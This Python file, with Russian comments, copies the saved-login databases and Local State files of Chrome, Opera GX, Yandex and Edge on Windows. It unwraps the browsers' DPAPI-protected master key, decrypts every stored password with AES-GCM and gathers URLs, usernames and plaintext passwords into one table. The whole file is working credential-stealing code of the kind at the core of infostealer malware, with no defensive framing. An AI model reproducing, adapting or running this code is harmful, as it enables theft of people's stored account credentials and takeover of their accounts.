import os
import sqlite3
import win32crypt
import json
import base64
from Crypto.Cipher import AES
import pandas as pd
import shutil


class Browser:
    def __init__(self, local_state_path, login_data_path):
        self.app_data_path = fr"C:\\Users\\" \
                             fr"{os.environ.get('USERNAME')}\\AppData"

        self.local_state_path = self.app_data_path + local_state_path + " 2"
        self.login_data_path = self.app_data_path + \
                               login_data_path + " 2"

        shutil.copy2(self.app_data_path + local_state_path,
                     self.local_state_path)

        shutil.copy2(self.app_data_path + login_data_path,
                     self.login_data_path)

    def __repr__(self):
        return "Browser"

    def __get_master_key(self):
        with open(self.local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(
                local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(
                master_key, None, None, None, 0)[1]
        return master_key

    def __decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def __generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def __decrypt_password(self, buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = self.__generate_cipher(master_key, iv)
        decrypted_pass = self.__decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass

    def get_password(self) -> pd.DataFrame:
        df = pd.DataFrame({
            "url": [],
            "username": [],
            "password": [],
        })

        try:
            conn = sqlite3.connect(self.login_data_path)
        except sqlite3.OperationalError:
            return df  # Не найдет путь до нужного файла, отправляем пустой массив

        cursor = conn.cursor()

        try:
            cursor.execute('SELECT origin_url, action_url, '
                           'username_value, password_value FROM logins')
        except sqlite3.OperationalError:
            return df  # Отправляем пустой массив, если не найдены логины браузера

        for result in cursor.fetchall():
            encrypted_password = result[3]
            password = self.__decrypt_password(
                encrypted_password, self.__get_master_key())
            login = result[2]
            if result[1]:
                url = result[1]
            else:
                url = result[0]
            if password != '':
                series = pd.Series({
                    "url": url,
                    "username": login,
                    "password": password,
                })
                df = df.append(series, ignore_index=True)

        return df


class Chrome(Browser):
    def __init__(self):
        super().__init__(local_state_path=r"\\Local\\Google\\Chrome\\"
                                          r"User Data\\Local State",
                         login_data_path=r'\\Local\\Google\\Chrome\\'
                                         r'User Data\\Default\\Login Data')

    def __str__(self):
        return "Chrome"


class Opera(Browser):
    def __init__(self):
        super().__init__(local_state_path=r"\\Roaming\\Opera Software\\"
                                          r"Opera GX Stable\\Local State",
                         login_data_path=r"\\Roaming\\Opera Software\\"
                                         r"Opera GX Stable\\Login Data")

    def __str__(self):
        return "Opera"


class Yandex(Browser):
    def __init__(self):
        super().__init__(local_state_path=r"\\Local\\Yandex\\"
                                          r"YandexBrowser\\User Data\\Local State",
                         login_data_path=r"\\Local\\Yandex\\"
                                         r"YandexBrowser\\User Data\\Default\\Login Data")

    def __str__(self):
        return "Yandex"


class Edge(Browser):
    def __init__(self):
        super().__init__(local_state_path=r"\\Local\\Microsoft\\"
                                          r"Edge\\User Data\\Local State",
                         login_data_path=r"\\Local\\Microsoft\\"
                                         r"Edge\\User Data\\Default\\Login Data")

    def __str__(self):
        return "Edge"


def get_all_passwords():
    browsers = [Opera(), Yandex(), Edge(), Chrome()]
    success_password = pd.DataFrame({"url": [],
                                     "username": [],
                                     "password": [],
                                     })

    for browser in browsers:
        password = browser.get_password()
        if not password.empty:
            success_password = \
                success_password.append(password, ignore_index=False)

    return success_password
